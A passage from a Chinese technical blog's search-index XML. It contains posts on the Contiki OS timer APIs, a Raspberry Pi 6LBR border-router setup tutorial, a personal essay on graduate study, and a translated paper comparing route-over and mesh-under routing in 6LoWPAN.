*t);//获取一个Timer定时器对象距离所设置的到期时长还剩余多少时间clock_time_t timer_remaining(struct timer *t);#endif /* TIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的timer.c文件中。 Stimer简介 设定定时器，以second作为时间精度，等待时间到达以后触发，需要轮询调用。实际上stimer这个模块跟timer的用法，及API的功能完全一致，只不过timer定时us级别的时间，stimer定时s级别的时间。 定时器API定义/home/user/contiki/core/sys/stimer.h 123456789101112131415161718192021222324252627#ifndef STIMER_H_#define STIMER_H_#include &quot;sys/clock.h&quot;/** * 定义一个Stimer定时器对象。定时器在使用之前必须通过stimer_set()进行设置。 */struct stimer &#123; unsigned long start; unsigned long interval;&#125;;// 设置并启动一个Stimer定时器对象void stimer_set(struct stimer *t, unsigned long interval);// 重置一个Stimer定时器对象void stimer_reset(struct stimer *t);// 重启一个Stimer定时器对象void stimer_restart(struct stimer *t);// 检查一个Timer定时器对象是否到期int stimer_expired(struct stimer *t);// 获取一个Timer定时器对象距离所设置的到期时长还剩余多少时间unsigned long stimer_remaining(struct stimer *t);// 得到定时器启动后的时间unsigned long stimer_elapsed(struct stimer *t);#endif /* STIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的stimer.c文件中。 Etimer简介 事件定时器，调用clock_time获得当前系统的时间，它提供产生时间事件（timed event）的机制，当设定好的定时器到期时将会给绑定定时器的线程发送一个PROCESS_EVENT_TIMER 事件； contiki系统可以使用这个定时器做事件调度，主要用在contiki进程当系统的其它功能工作或休眼时，这个进程在等待一个时钟周期。Rime协议栈里面会经常用来处理通信超时。 定时器API定义/home/user/contiki/core/sys/etimer.h 1234567891011121314151617181920212223242526272829303132333435363738#ifndef ETIMER_H_#define ETIMER_H_#include &quot;sys/timer.h&quot;#include &quot;sys/process.h&quot;// 定义一个Etimer定时器对象，定时器在使用之前必须通过etimer_set()进行设置。struct etimer &#123; struct timer timer; struct etimer *next; struct process *p;&#125;;// 设置并启动一个Etimer定时器对象CCIF void etimer_set(struct etimer *et, clock_time_t interval);// 重置一个Etimer定时器对象CCIF void etimer_reset(struct etimer *et);// 重启一个Etimer定时器对象void etimer_restart(struct etimer *et);// 获取事件定时器的过期时间。void etimer_adjust(struct etimer *et, int td);// 获取事件定时器的到期时间clock_time_t etimer_expiration_time(struct etimer *et);// 获取事件定时器的启动时间clock_time_t etimer_start_time(struct etimer *et);// 检查一个Etimer定时器对象是否到期CCIF int etimer_expired(struct etimer *et);// 停止一个Etimer定时器对象void etimer_stop(struct etimer *et);// 通知事件定时器时钟已更改void etimer_request_poll(void);// 检查是否有任何非过期的事件定时器int etimer_pending(void);// 所有即将到期的事件定时器的下一个到期时间clock_time_t etimer_next_expiration_time(void);PROCESS_NAME(etimer_process);#endif /* ETIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的etimer.c文件中。 Ctimer简介 回调定时器，调用etimer，触发以后调用回调函数； 由于Ctimer同样也是事件定时器，只不过多了一个回调的功能，所以在初始化Ctimer时，用etimer_set来初始化系统启动时需要的Ctimer，然后标记初始化完成。在ctimer_process中，主要是去轮询过期的Ctimer，然后再进行回调。请注意,由于回调函数在另一个进程中,所以根据protothread的设计，需要调用 PROCESS_CONTEXT_BEGIN()和PROCESS_CONTEXT_END()来临时的开辟其它进程中的上下文，最后关闭。（可参考ctimer_process的具体实现进行分析） 定时器API定义/home/user/contiki/core/sys/ctimer.h 12345678910111213141516171819202122232425262728#ifndef CTIMER_H_#define CTIMER_H_#include &quot;sys/etimer.h&quot;// 定义一个Ctimer定时器对象struct ctimer &#123; struct ctimer *next; struct etimer etimer; struct process *p; void (*f)(void *); void *ptr;&#125;;// 复位一个Ctimer定时器对象void ctimer_reset(struct ctimer *c);// 重启一个Ctimer定时器对象void ctimer_restart(struct ctimer *c);// 设置并启动一个Ctimer定时器对象void ctimer_set(struct ctimer *c, clock_time_t t, void (*f)(void *), void *ptr);// 停止一个Ctimer定时器对象void ctimer_stop(struct ctimer *c);// 检查一个Ctimer定时器对象是否到期int ctimer_expired(struct ctimer *c);// 初始化Ctimer定时器void ctimer_init(void);#endif /* CTIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的ctimer.c文件中。 rtimer 实时定时器，直接调用硬件平台，设定一个硬件实时定时器，触发以后调用一个定时器回调。它可以抢占任何进程，这样使得实时任务可以准确调度。 有两种类型的实时任务：一种是硬实时任务，一种是软实时任务，其中硬实时任务的优先级要高点。 rtimer与其它的timer不一样的是，它在平台这一层只是提供了三个接口： rtimer_init rtimer_set rtimer_run_next 这三个接口的实现是严重依赖于MCU的特性的。 定时器API定义/home/user/contiki/core/sys/rtimer.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#ifndef RTIMER_H_#define RTIMER_H_#include &quot;contiki-conf.h&quot;#ifndef RTIMER_CLOCK_LTtypedef unsigned short rtimer_clock_t;#define RTIMER_CLOCK_LT(a,b) ((signed short)((a)-(b)) &lt; 0)#endif /* RTIMER_CLOCK_LT */#include &quot;rtimer-arch.h&quot;void rtimer_init(void);struct rtimer;typedef void (* rtimer_callback_t)(struct rtimer *t, void *ptr);// 定义一个Ctimer定时器对象struct rtimer &#123; rtimer_clock_t time; rtimer_callback_t func; void *ptr;&#125;;enum &#123; RTIMER_OK, RTIMER_ERR_FULL, RTIMER_ERR_TIME, RTIMER_ERR_ALREADY_SCHEDULED,&#125;;// 设置并启动一个rtimer定时器对象int rtimer_set(struct rtimer *task, rtimer_clock_t time, rtimer_clock_t duration, rtimer_callback_t func, void *ptr);void rtimer_run_next(void);// 用于获取当前的rtimer时间#define RTIMER_NOW() rtimer_arch_now()#define RTIMER_TIME(task) ((task)-&gt;time)// 针对特定平台的初始化操作，被rtimer_init()函数调用void rtimer_arch_init(void);// 传递一个唤醒时间，在特定时刻进行调度操作，调用rtimer_run_next()void rtimer_arch_schedule(rtimer_clock_t t);/*rtimer_clock_t rtimer_arch_now(void);*/// rtimer每秒的滴答数#define RTIMER_SECOND RTIMER_ARCH_SECOND#endif /* RTIMER_H_ */ API的具体实现位于/home/user/contiki/core/sys目录下的rtimer.c文件中。]]></content>
      <categories>
        <category>IoT</category>
        <category>Contiki</category>
      </categories>
      <tags>
        <tag>［IoT,Contiki,timer］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Raspberry Pi 6LBR配置教程]]></title>
    <url>%2F2017%2F03%2F31%2FRaspberry-Pi-6LBR%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[6LBR 是目前国际上较为优秀的基于 Contiki 系统的 6LoWPAN 边界路由器解决方案。和现有的其他边界路由器方案相比，6LBR 是唯一一个不需要 Linux 主机的独立边界路由器，并且能够提供IPv6/NDP 和 RPL 之间的智能互联。 本文介绍了如何在Raspberry Pi上配置6LBR。 下载安装下载6LBR12345$ git clone https://github.com/cetic/6lbr$ cd 6lbr$ git submodule update --init --recursive$ cd examples/6lbr$ git checkout develop-1.4.1 #根据6LBR项目的版本修改版本号，目前稳定版为1.4.1 编译6LBR123$ make all #如果要使用1.4以下版本，只要把命令改为make TARGET=native all即可$ make plugins$ make tools 安装6LBR123$ make install$ make plugins-install$ update-rc.d 6lbr defaults 注意：建议安装稳定版本，低于1.4的版本有些功能好像不支持，比如NAT64，而最新版本则亲测不稳定。 6LBR配置 默认情况下6LBR是没有配置文件的，只是在/etc/6lbr/目录下给了几个例子，我们需要自己新建conf.d文件。 配置6LBR模式 配置为路由器模式，在/etc/6lbr/conf.d文件夹下： 1MODE=ROUTER 接口配置 你需要在你的 /etc/6lbr/6lbr.conf 文件中进行如下配置（我们假设你的以太网接口是eth0）： 123456RAW_ETH=0BRIDGE=1CREATE_BRIDGE=0DEV_ETH=eth0DEV_BRIDGE=br0DEV_TAP=tap0 你还需要创建一个桥接接口br0，在 /etc/6lbr 目录下，我们提供了两个/etc/network/interfaces 文件的例子。例如，如果你使用DHCP，文件的内容应该是： 12345678910111213...iface eth0 inet staticaddress 0.0.0.0auto br0iface br0 inet dhcp bridge_ports eth0 bridge_stp off up echo 0 &gt; /sys/devices/virtual/net/br0/bridge/multicast_snooping post-up ip link set br0 address `ip link show eth0 | grep ether | awk &apos;&#123;print $2&#125;&apos;`... SLIP-RADIO配置接线说明 使用USB转TTL模块，将Raspberry Pi与SLIP-Radio（即一个contiki节点，使用cc538dk）连接起来。 编译程序12$ cd 6lbr/example/$ make TARGET=cc2538dk 得到bin或者hex文件，用于下一步的烧录。 烧写程序 cc2538dk程序烧写步骤请参考博客：Contiki CC2538dk 串口下载程序 启动6LBR1$ service 6lbr start 节点配置 节点我们暂时采用6LBR提供的demo进行测试，该demo位于6lbr-develop/examples/6lbr-demo，后续博客在讲解如何进行移植。 编译程序12$ cd examples/6lbr-demo$ make TARGET=cc2538dk 得到bin或者hex文件，用于下一步的烧录。 烧写程序 cc2538dk程序烧写步骤请参考博客：Contiki CC2538dk 串口下载程序 效果测试 你需要找一台与你的树莓派在同一个局域网的电脑，将其IPv6地址设定为bbbb::101，然后打开浏览器访问bbbb::100，即可看到6LBR的配置界面。可以在网页端对网络进行各种配置，具体教程后续博客会介绍，这里不展开了。6lbr提供的demo默认都是支持RPL的，所以我们可以使用几个节点，然后组成如下的传感网络。]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>［IoT,6LBR,6LoWPAN］</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[心之所向，素履以往]]></title>
    <url>%2F2017%2F03%2F27%2F%E5%BF%83%E4%B9%8B%E6%89%80%E5%90%91%EF%BC%8C%E7%B4%A0%E5%B1%A5%E4%BB%A5%E5%BE%80%2F</url>
    <content type="text"><![CDATA[凡心所向，素履所往，生如逆旅，一苇以航。 －－－七堇年《尘曲》 很久很久没有写过关于Life的博客了吧，或许真的是因为我懒，又或许如此安静平凡的生活真的没什么可写的，但是既然兴致来了，那就写写吧。 来中南学习已经一个半月了，谈谈感受吧。提前来体验研究生生活是我自己的选择，对于这个选择我一直都坚信是正确的，现在想想也确实收获不小。提前来这边有两个目的，一是完成毕业设计，二是熟悉研究生阶段将要研究的方向。目前看来，虽然遇到很多困难，但是二者都在稳步前进。 在这边相对自由，没有那么多的约束，但是学习的氛围却很浓，导师和师兄师姐也都很好，所以也很快适应了这边的生活。其实，真的没说错，越好的学校学习气氛越好。原以为自己已经够努力了，来到这边才知道什么叫努力，特别佩服博士师兄，每天到得早回得晚，做的事情也多。没有太多的约束，也没有老师天天管着，但是大家都会很自觉地在实验室学习，我也慢慢习惯在实验室待一整天的生活。 最近很认同朋友说的一句话：出了社会才知道自己根本不算什么。确实啊，来到这边自己也是很有压力的，尽管你在原来的学校可能已经是比较厉害的了，可是来到这里你才发现什么叫做差距，确实还有很多需要努力的地方，但是我也相信，我还有时间可以赶得上。 在这边最喜欢的应该是每周的交流与讨论了，其实自己早就很向往这种学术沙龙式的交流活动。每周的组会，说不上多么高大上，但是自己的汇报以及导师和师兄师姐的提问，都会带来一些思考。期间还经历了两次论文分享，自己也分享了一次。论文分享就是先自己去读比较新的文章，然后做PPT给大家汇报文章的内容，然后大家针对文章进行提问展开讨论。从一开始不知道如何提问，到慢慢参与他们的讨论，我发现每一次论文分享都是思维的碰撞。我分享的那次讲得确实不好，总结下来，一方面是自己给自己太大的压力以及自己的不自信，另一方面是自己对TCP/IP体系结构的很多协议与实现机制没有深入的认识。另外，我也在尝试着参与师兄师姐的项目，和他们一起讨论解决方案，虽然每次都觉得没帮上什么忙，但是他们的思路以及互相的讨论也给了我不少的启发。 说实话，真的特别特别喜欢这样的学习交流，每次的讨论都会带来很多问题，然后就可以带着问题去寻找答案，所以说，每周除了做毕设，还要尝试着去解决一些问题，这也是每天都过得还算充实的原因。 让我突然觉得自己有所收获的是最近回本科学校，拿着毕业设计的前两章内容给老师看，他说这样写不行，我把本科生论文写成研究生论文了，突然意识到，这或许就是这段时间的进步吧。这边导师强调做毕设得过程中多了解网络协议，这就是和本科的区别啊，本科往往注重的是如果实现一个设计，而研究生则不仅仅满足于此，因为还要做研究，那么其中的协议就要搞得清清楚楚，甚至还要去优化协议。让我开心的是，我也竟然也开始有了这种思维，而不仅仅局限于如何去实现我的设计。 这段时间除了实验室的学习，依然也有自己的生活，看了不少的纪录片，关于社会、关于生命、关于旅行、关于历史等等，很多精彩的纪录片真的值得去看，也值得去思考。当然，也依然在坚持做一直觉得重要的事情，也就是写写博客，学学自己想学的，总之，一切都那么简单那么平静。 近来，自己的博客也慢慢得到一些人的喜欢，也有一些朋友通过博客来加好友，很难得能够和这些有共同兴趣爱好的朋友一起交流一起进步，这或许也是写博客的意义吧。这段时间我也回学校好几次，去拜访过老师，也去给实验室的学弟学妹做过分享，也去见过老友。很开心的是，室友也都找到工作了，只是突然发现，真的真的马上就要毕业了。上次还说，现在回去还能有地方睡，想着以后在农大就没有一张床随时给我备着了。莫名的伤感啊，大学四年，马上，大家就要各奔东西了。 写着写着就有写到毕业去了，这件事真的不能多想，一想就停不下来，还是就此打住吧。最近特别喜欢希望一句话：心之所向，素履以往。不管是目前还在努力前进的自己还是最近参加研究生复试的朋友、接下来还要找工作或者考公务员的朋友，我想大家都是在追逐梦想，所以，希望大家加油，也希望大家都能如愿。 时间不早了，零零散散写了很多，我不是一个好的作者，但是有空我还是会再写写Life的。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[译]Route-over vs Mesh-under Routing in 6LoWPAN]]></title>
    <url>%2F2017%2F03%2F26%2F%E8%AF%91-Route-over-vs-Mesh-under-Routing-in-6LoWPAN%2F</url>
    <content type="text"><![CDATA[6LoWPAN中的路由协议划分为两类：mesh-under和route-over。对于mesh-under方案的路由决策是在适适配层，而路由router-over方案的决策发生在网络层。分析了route-over和mesh-under路由方案的概率模型，并从不同的角度对这两种方案进行了评估。 摘要：通过低功耗无线个人区域网络（6LoWPAN）传输IPv6数据包被认为几乎不可行。 IPv6数据包的大小远大于IEEE 802.15.4数据链路层的数据包大小。6LoWPAN在网络和数据链路层之间实现适配层。适配层的主要目的是分片和重组IPv6数据包。适配层的实现增强了网络层和适配层之间的路由/转发决策。根据在适配层或网络层上进行的路由决策，我们可以将6LoWPAN中的路由方案划分为两类：mesh-under和route-over。在本文中，我们在分组/分片到达概率，总传输次数和源和目的地之间的总延迟方面，对这两个方案进行分析比较。我们还比较了mesh-under和route-over方案之间的选择性分片重传机制。 关键词：6LoWPAN,routing,WSN 引言 IEEE 802.15.4 标准为低功率无线个人区域网络定义了一个无线链路，广泛应用于诸如栖息地监测，楼宇自动化，安全，物体跟踪，核反应堆控制，火灾探测和交通监控等嵌入式应用。它同样也被用于几个以人为中心的应用程序，比如健康检查，设备互连和健身相关的应用。大面积实现这些应用程序需要庞大数量的低功耗和低成本的节点/设备。它也被认为这些应用程序应该有一个延长生命周期。 IEEE 802.15.4网络设备相比其他无线个域网或无线局域网有能力有限。IEEE 802.15.4的关键特性是127字节的小MTU大小，250kbps的低数据速率，如果它在2.4 GHz频段，短距离通信和内置的AES-128加密和认证方法中工作。除了长地址（64-bit EUID），它也支持16位的设备短地址。因此，这些短地址降低了通信开销并在WPAN(无线个人局域网通讯技术)内保持独特的通信。LoWPAN(低功耗无线个人区域网络)设备的典型RAM大小范围为2KB到10KB。 IPv6是互联网层协议和IPv4的后继者。IPv6解决了从32位到128位的IP地址空间，IPv6的最小MTU为1280字节。由于认为IP时资源密集的，并且IPv6的MTU为1280字节，然而IEEE 802.15.4数据链路层的MTU为127字节，所以通过LoWPAN传输IPv6数据包是困难的。 6LoWPAN由IETF定义，在RFC4919中标准化和描述。6lowpan实现网络层和数据链路层支持6LoWPAN IPv6数据包的传输在锡安之间的适配层。 6LoWPAN由IETF标准定义，并在RFC 4919中描述。 6LoWPAN在网络和数据链路层之间实现适配层，以支持通过LoWPAN传输IPv6数据包。在实施适配层之后，可以在传统网络层或适配层中进行路由/转发决策。如果在网络层中采用路由决策，我们将其称为router-over，如果在适配层中采用该决策，则称之为mesh-under。 本文的贡献是对6LoWPAN中的mesh-under和route-over路由方案的分析。我们展示了这两种方案在片段/分组到达概率，重传策略，源与目的地之间的总延迟（基于分组中的片段数））和源与目的地之间的跳数的差异。本文的其余部分描述如下：第2节描述了6LoWPAN的背景。第3节描述了mesh-under和route-over路由方案。第4节对这两个方案进行了一个数学比较。第5节讨论了我们的观察结果，最后是第6节。 背景 IETF标准定义了6LoWPAN的概述，假设，问题陈述和目标。IPv6的分组大小远大于IEEE 802.15.4数据链路层的MTU，导致IPv6分组的分片和压缩。能源效率也是6LoWPAN传输的重要问题。 6LoWPAN是关于如何通过LoWPAN传输IPv6数据包的IETF标准，这在RFC 4944中有描述。 6LoWPAN在TCP/IP协议栈中的数据链路和网络层之间引入了适配层。它通过使用报头压缩和分片IPv6数据包来支持IPv6数据包的最小MTU，大大降低了IP传输开销。6LoWPAN还使用数据链路层中的多跳转发，通过多跳方案从源到目的地传递IPv6数据包。采用适配层的一个字节调度值来确定帧是否为LoWPAN帧。如果帧是LoWPAN帧，那么类型特定的报头将作为调度值的一部分进行。对于特定类型头的具体值，可能存在未压缩/压缩的IPv6报头，分段报头，Mesh报头或广播报头。如果IP数据包的大小大于数据链路层的MTU，则分片是必不可少的。分片头在适配层的调度值之后发生。分片头的出现由调度字节的特定值决定。由于分片的简单性，第一片段和后续片段的调度值是不同的。片段的偏移量只能显示八个字节长度的倍数。所以除了最后的片段，所有其他片段都是八个字节的倍数。如果同一分组中有多个报头，则依次放置mesh寻址报头，广播报头和分片报头。 文献1提到了mesh-under和route-over的问题。6LoWPAN架构解决了6LoWPAN的route-over和mesh-under路由方案的许多问题。IETF 6LoWPAN工作组还负责定义6LoWPAN路由的问题陈述和要求。相关作品[1]和[11]仅讨论了mesh-under和route-over方案的一些问题。但是，它们不提供mesh-under和route-over方案之间的任何分析比较。 6LoWPAN的路由 6LoWPAN中的路由协议是敏感的，因为节点的能力在能量，传输范围等方面受到限制。LoWPAN（[7]-[10]）的路由协议已经有很多发展。基于应用场景，6LoWPAN中的路由可以分为：泛洪，数据感知路由，地理路由，概率路由，事件驱动，基于查询的路由和分层路由。 路由决策基于哪个层，即数据转发发生在哪个层，我们可以将6LoWPAN中的路由协议划分为两类：mesh-under和route-over。图1 显示了路由决策发生在TCP/IP 6LoWPAN协议栈的哪一层。对于mesh-under方案的路由决策是在适适配层，而路由router-over方案的决策发生在网络层。在route-over和mesh-under方案中的路由问题主要区别在于包/分片的转发过程而不是路由建立阶段。下面的小节详细描述了route-over和mesh-under路由方案上的细节。 Mesh-under 在Mesh-under方案中，在一个LoWPAN内部网络层不执行IP路由。适配层执行执行mesh路由并通过多跳转发包到目的地。在Mesh-under方案中，基于802.15.4帧或6LoWPAN头的链路层进行路由转发。要将数据包发送到特定目的地，使用EUI 64位地址或16位短地址并将其发送到邻居节点，以使数据包更接近目的地。多个链路层跳被用于完成单个IP跳，因此称为mesh-under。6LoWPAN采用源地址和目的地址的思想，分别描述PAN内单个IP跳的起始源地址和最终目标节点。由于链路层发起者和最终目的地址包含在6LoWPAN报头中，所以适配层上的任何协议的mesh传递是可能的。IP包被适配层分段到多个分片。这些片段通过mesh路由传递到下一跳，最终到达目的地。IP分组的不同分片可以通过不同的路径，并且它们在目的地聚集。如果所有分片都成功到达，则目标节点的适配层重新组合所有分片并创建IP包。在转发过程中丢失任何分片的情况下，将整个IP分组（即该IP分组的所有片段）重传到目的地以进行恢复。 Route-over 通常在route-over方案中，所有路由决策都在网络层中进行，每个节点充当IP路由器。在路由过程中，每个链路层跳是一个IP跳。IP路由支持在这些链路之间转发数据包。在转发过程中，使用IP路由表和IPv6逐跳选项。对于路由和转发过程，网络层使用附加的封装IP报头进行决策。6LoWPAN的适配层建立了帧和IP报头之间的直接映射。当IP包被适配层分段时，根据路由表信息将片段发送到下一跳。下一跳的适配层检查接收的片段。如果所有片段都被成功接收，则适配层从片段中创建一个IP包，并将其发送到网络层。如果分组发往自己，则网络层将IP分组发送到传输层，否则根据路由表信息将分组转发到下一跳。如果有一个或多个片段丢失，则所有片段都被重传到一跳距离。在成功接收到所有片段后，适配层从这些片段创建一个IP包，并将其传递到网络层。网络层然后基于分组的目的地和路由表信息转发或处理IP分组。 Mesh-under的选择性重传 通常在mesh-under方案中，如果一个或多个片段在路由路径中丢失，则所有片段都将从源重传到目的地。我们可以使用基于从目的地到源的选择性否定确认（NACK）的选择性分片重传机制。根据NACK，仅重传丢失的片段，并将先前发送的分片保存在目的地的缓冲区中。然后，目的地的适配层从保存的和新接收的分片创建一个IP包。本文称之为“Mesh-under选择重传(SRMU)”。 Route-over的选择性重传 通常在Route-over方案中，如果路径中丢失了一个或多个分片，则所有分片都将重新发送到下一跳。如果一个或多个分片在一跳距离内的发送者和接收者之间丢失，则可以向发送者确认选择性NACK以重传丢失的片段。我们可以将所有片段保存在下一跳的缓冲区中。在成功接收到丢失的片段之后，适配层将保存的和新接收的片段重新组合到IP包中。本文将全过程命名为“Route-over的选择重传(SRRO)”。 分析 在这一部分，我们找出了Route-over和Mesh-under方案的概率模型。假设从网络层接收的IP包被适配层划分为f个片段。此外，假设h是从源到目的地的每个片段所经历的跳数。 无恢复情况下的能源效率 在route-over的情况下，任何中间跳的任何片段的丢失导致所有后续接收的片段的丢弃。而在mesh-under的情况下，如果在中间跳段丢失了任何片段，则其余片段将被传播到目的地，因为除了目的地节点之外，整个网络中的每个片段被独立处理。因此，route-over恢复方案比在mesh-under下节点更节能，因为它不向下一跳发送任何不必要的分片。 分片到达概率 令p是在单次尝试中分片在一跳距离中成功到达的概率。N是将分片发送到下一跳的重试次数。因此，在N次重试之后，到达一个片段的概率Pro到一跳距离由方程式1给出。 $$ P_{ro} = \sum_{i=1}^Np(1-p)^{i-1} $$ 在route-over方案中，丢失的片段以逐跳的方式被恢复。因此，对于h跳距离，到达多跳距离的概率是相同的，因为每次将所有分片重新组合、分片并以相同的概率发送到下一跳。 由于mesh-under方案中丢失的分片是进行端到端的检查，则对于特定次数的重传N和对于h跳距离，分片到达的概率为等式2Pmu。 $$ P_{mu} = {(\sum_{i=1}^{N}p{(1-p)}^{i-1})}^h $$ 图2显示了在分片的目的地的分片到达概率，它是对于一跳距离的重传2次进行7跳的概率。我们观察到对于route-over的情况，到达分片的概率比mesh-under更高。原因是，在每一跳IP数据包需要重新重组然后再以初始概率发送。然而，对于mesh-under的情况，在中间节点上没有创建IP数据包，每个分片单独到达目的地。所以，每次跳完后概率降低了。 总共传输的数据包 在本节中，我们假设最短路由路径是指消息在源与目的地中间节点的成功到达。假设这样，我们要确定在第i个中间节点开始的成功传递或到达消息的预期消息数量，分别达到源或目的地之前，即0，n。这里我们称这个量为 $ m_i $`，i = 1，…，n - 1。概率$ j^{th} , j≥1 $，消息在任何中间节点成功到达。我们想要找出与最终目的地通信所需的中间节点/跳数的预期数量。令B，公式3，是源和目的地之间的中间节点的最小数量。 $$ B = Min{m:{\sum_{j=1}^{m}X_j = -i}} $$ 每个中间跳被认为是成功地接收并发送分组到下一跳或最终目的地。在路线超过方程式的成功传输的总预期数量公式4。 $$ E[\sum_{j=1}^{B}X_j] = pE[B] - q $$ 这里的E[B]，公式7，表示预计最快的渡轮数量，$ E[\sum_{j=1}^{B}X_j] $ 表示从源到目的地成功传输的预期数目。成功路由的包，例如公式5，取决于在每个跳的几何概率分布。 $$ \sum_{j=1}^{B}X_j = \begin{cases} n-i &amp; with prob.\alpha,\ -i &amp; with prob.(1-\alpha) \end{cases} $$ $$ (2q-1)E[B] = \alpha - i $$ $$ E[B] = \frac {1} {2p-1} (\frac {n[1-(q/p)^i]} {1-(q/p)^n} - i) $$ p是在$ q=1-p $是每跳的故障概率时接收和转发分组/片段的成功概率。 在源与目的地之间的总延时 令Tw为在竞争期间的等待时间，Tp是分片的传播延时，Tnp是分片的节点处理时间。令h为经历的跳数，f为分片的数量。mesh-under方案的总的端到端传输延时Ttmu为： $$ T_{tmu} = (T_w + T_p)h + T_{np}(h - 1) + (f - 1)(T_w + T_p) $$ 在公式9中，$ (T_w + T_p)h $是在一个竞争周期总的等待时间和总的传输延时的和，$ T_{np}(h - 1) $节点处理时间的总和，$ (f - 1)(T_w + T_p) $是路由中所有分片除了第一个节点之外的所有节点的总等待时间。 router-over路由方案的总传输延时$ T_tro $为： $$ T_{tro} = (T_w + T_p)f*h + (h - 1)*(T_{np} + \delta) $$ 在公式10中，$ \delta $是在中间跳的重组和分片的时间。这里，$ (T_w + T_p)f*h $是一个竞争周期等待时间和传播f个分片经历h跳的延时。$ (h - 1)*T_{np} $中间节点处理和重组的时间。route-over方案包括中间节点IP包分片重组的延时。因此，在源到目的地之间的总的延时mesh-under方案表现要比route-over方案更好。 缓冲区大小 传感器节点的缓冲区大小有限。Route-over和SRRO恢复机制存储所有分片并等待其他分片。如果网络的流量太多并且一个节点正在接收来自不同节点的数据包（作为中间跳），则会有缓冲区溢出的可能。另一方面，在mesh-under或SRMU中，由于没有逐跳恢复，所以如果网络流量过多，中间节点的缓冲区大小也不会生效。 端到端恢复的SRRO和逐跳恢复的SRMU比较 mesh-under和route-over可以分别被看作是端到端的和逐跳的，在传统的mesh-under或route-over方案中，当一个IP分组发送到目的地或者下一跳并且如果由于IP分组大小而发生分片，则根据方案必须在下一跳或者目的地重新组合分片。 对于SRMU，如果一个IP数据包被分片成F个片段并且经过H跳传输到目的地，那么预期的到达目的地的分片数在等式11给出： $$ E[f(F,H)] = \sum_{m=1}^Fm.P_{mu}^m (1 - P_{mu})^{F-m} $$ $ P_{mu} $是由等式2得到的mesh-under下的端到端概率。如果我们传输一个分片经过H跳，那么分片期望经过的跳数$E[f_h(H)] $，由等式12给出。 $$ E[f_h(H) = \sum_{m=1}^{H-1}m.P_{mu}^{m-1}(1 - P_{mu}) $$ 在一次尝试中发送F个片段的近似成本是$ C_{apx} $ $$ C_{apx} = H.E[f(F.H)] + E[f_h(H)].(F - E[f(F,H)]) $$ 在SRMU的情况下，如果有一些片段丢失，而第一次尝试，我们发送一个选择性的NACK，只重新传输丢失的片段。因此，在第二次尝试中，我们可以获得多少个片段已经丢失并重传，并使用公式11到13获得传输计数。对于第k次尝试中的片段传输故障的情况，我们可以递归地计算后续步骤的传输次数。如果我们添加所有这些传输计数，我们可以获得SRMU机制的片段传输总数。 对于SRRO的情况，恢复是逐跳进行的。因此，IP数据包将到达下一跳并且下一跳将缓存分片并检查所有分片是否到达。如果有任何分片传输失败我们发送一个选择性NACK来只重传丢失的分片。因此，当所有分片到达下一跳（或者目的地）6LoWPAN适配层将重组所有分片并创建一个IP数据包。因此IP数据包将从源到目的地遍历。对于SRRO案例，在一跳成功移动一个分片期望的重试次数是 $$ E[r(N)] = \sum_{k=1}^{\infty} k.P_{ro}(1 - P_{ro})^{k - 1} $$ $ P_{ro} $是由公式1得到的route_over的概率。因此，对于H跳，如果来自IP数据包的片段数为F，则传输的总数为 $$ E[f(H,F)] = F.H.E[r(N)] $$ 如果我们计算发送IP包的总数量超过H跳距离，那么我们观察到从公式11-15 SRRO需要的传输数量少于SRMU。如果跳数或来自IP包的片段数量增加，差异将迅速增加。RMST[6]也向我们展示了传输层的逐跳对端到端恢复相似的分析。他们还表明，逐跳式表现优于端对端恢复方案。从分析可以看出，如果我们实现选择性NACK并仅重新传输丢失的片段，那么与传统的网格或路由选择方案的恢复相比，它将减少重传的总数。 观察 从route-over和mesh-under方案的概率分析可以看出，对于目的地的分片到达率，route-over可能比mesh-under更高效。如果发生一个或多个分片故障，route-over和mesh-under方案都会重传所有片段，从而在网络中产生额外的开销。选择性分片重传机制 (SRRO 或 SRMU)可能可以克服这个问题。我们知道传感节点的缓冲区大小是有限的，因此如果网络内产生的流量太大并且一个节点被用作多个传输路径的中间节点，那么在route-over方案中缓冲区可能会溢出。然后，在mesh-under方案中间节点没有溢出的可能性。在总延时方面，mesh-under方案优于route-over方案。route-over方案对于在路径中有更多机会丢失分片的环境是有益的，因为它的逐跳恢复机制。另一方面，mesh-under方案在中间节点没有重组和分片的任何开销，但是如果IP分组的大小非常大或路由路径中的跳数大，则其具有较高的概率路由时丢失片段。因此，对于小的IP数据包大小或更少的跳数，mesh-under方案可能会比route-over方案更好。Mesh-under方案对于在路径中丢失分片的可能性更大的嘈杂环境来说不是一个好的选择。在某些类型的应用中，如果我们丢失一些IP数据包是没关系的并且如果网络拥有太多的流量，那么mesh-under方案应该比route-over方案更好。 结论 在本文中，我们分析了route-over和mesh-under路由方案的概率模型。得出的结论是，从源到目的地的转发分片route-over方案比mesh-under方案更可靠。清楚的是如果在route-over和mesh-under方案中采用选择性重传，route-over方案在传输数量方面表现优于mesh-under方案。然而，在总延时方面，mesh-under方案优于router-over方案。将来，我们要在IEEE 802.15.4仿真环境中模拟route-over和mesh-under方案，并增强其性能评估。我们还计划模拟route-over和mesh-under方案的SRRO和SRMU机制。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IoT</tag>
        <tag>6LoWPAN</tag>
        <tag>Route</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[6LoWPAN Border Router：6LBR 接口配置]]></title>
    <url>%2F2017%2F03%2F21%2F6LoWPAN-Border-Router%EF%BC%9A6LBR-%E6%8E%A5%E5%8F%A3%E9%85%8D%E7%BD%AE%2F</url>
